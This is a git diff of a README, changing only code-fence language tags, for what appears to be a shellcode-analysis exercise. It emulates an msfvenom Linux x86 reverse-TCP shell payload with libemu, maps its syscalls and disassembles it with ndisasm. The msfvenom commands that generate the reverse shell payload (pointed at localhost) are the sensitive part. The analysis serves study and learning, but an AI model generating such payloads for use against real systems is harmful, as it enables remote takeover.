@@ -14,7 +14,7 @@
 
 ## Usage
 
-```
+```bash
 python wrapper.py $IP $PORT
 ```
 
@@ -43,20 +43,20 @@ If the port causes problems, a warning message will appear:
 
 After installing Libemu, we will use the sctest binary. We can get the result using the binary directly:
 
-```
+```bash
 msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1 | ./sctest -vvv -Ss 10000 -G reverseshell.dot
 ```
 
 Or we can use the libemu.sh script (in scripts/ folder):
 
-```
+```bash
 sh libemu.sh "msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1" reverseshell | tee libemu_res/libemu_res.txt
 ```
 
 The result:
 
 
-```
+```cpp
 int socket (
      int domain = 2;
      int type = 1;
@@ -104,7 +104,7 @@ int execve (
 
 Once we know the system calls or syscalls, the values used in them and the order, it is necessary to get the hexadecimal values for every syscall, using cat and printf to print the hexadecimal value:
 
-```
+```bash
 cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep listen
 
 printf "%x\n" 363
@@ -113,7 +113,7 @@ printf "%x\n" 363
 Or the syscallhex.sh script (in scripts/ folder)
 
 
-```
+```bash
 sh syscallhex.sh listen
 ```
 
@@ -155,7 +155,7 @@ Now we know the value in the original shellcode which must be substituted. After
 ## Second approach: Ndisasm
 
 A second approach, which can be considered easier, is to get the nasm file from the raw output from msfvenom:
-```
+```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8888 --platform=Linux -a x86 -f raw | ndisasm -u -
 ```
 
